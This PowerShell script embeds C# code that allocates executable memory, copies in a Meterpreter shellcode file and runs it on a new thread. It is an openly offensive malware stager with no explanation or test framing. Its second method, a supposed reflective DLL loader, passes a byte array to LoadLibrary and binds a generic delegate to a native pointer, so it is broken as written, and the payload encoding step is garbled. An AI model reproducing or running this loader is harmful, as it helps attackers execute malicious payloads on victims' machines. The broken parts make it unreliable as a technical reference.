Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ReflectiveLoader
{
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(byte[] bytes);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool FreeLibrary(IntPtr hModule);

    public static void Inject(byte[] shellcode)
    {
        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
        Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);

        uint oldProtect;
        VirtualProtect(baseAddr, (uint)shellcode.Length, 0x20, out oldProtect);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public static void Load(byte[] dllBytes, string functionName, object[] arguments)
    {
        IntPtr moduleHandle = LoadLibrary(dllBytes);

        IntPtr functionAddress = GetProcAddress(moduleHandle, functionName);
        if (functionAddress == IntPtr.Zero) throw new InvalidOperationException("Failed to find function address");

        var function = (Func<object[], object>)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(Func<object[], object>));
        function(arguments);

        FreeLibrary(moduleHandle);
    }
}
"@

$payload = [System.IO.File]::ReadAllBytes("C:\path\to\your\meterpreter_payload.bin")
$bytes = [System.Convert]::ToBase64String($payload -replace '\r?\n', '')

[byte[]]$shellcode = @([System.Convert]::FromBase64String($bytes))

[ReflectiveLoader]::Inject($shellcode)
[ReflectiveLoader]::Load([System.IO.File]::ReadAllBytes("C:\path\to\your\reflective_dll.dll"), "EntryPoint", @())
